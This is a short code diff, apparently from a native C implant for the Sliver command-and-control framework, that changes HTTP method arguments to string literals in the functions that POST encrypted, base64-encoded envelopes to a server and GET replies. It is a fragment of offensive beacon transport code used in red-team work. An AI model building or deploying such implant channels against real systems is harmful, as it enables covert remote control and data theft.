@@ -364,7 +364,7 @@ BOOL WriteEnvelope
 	}
 
 	lpEncodedData = SliverBase64Encode(pCipherText, cbCipherText);
-	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, pUri->lpPathWithQuery, POST, NULL, lpEncodedData, lstrlenA(lpEncodedData), FALSE, FALSE);
+	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, pUri->lpPathWithQuery, "POST", NULL, lpEncodedData, lstrlenA(lpEncodedData), FALSE, FALSE);
 	if (pResp == NULL || (pResp->dwStatusCode != HTTP_STATUS_OK && pResp->dwStatusCode != HTTP_STATUS_ACCEPTED)) {
 		goto CLEANUP;
 	}
@@ -410,7 +410,7 @@ PENVELOPE ReadEnvelope
 	}
 
 	pUri = UriInit(lpUri);
-	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, pUri->lpPathWithQuery, GET, NULL, NULL, 0, FALSE, TRUE);
+	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, pUri->lpPathWithQuery, "GET", NULL, NULL, 0, FALSE, TRUE);
 	if (pResp == NULL) {
 		goto CLEANUP;
 	}
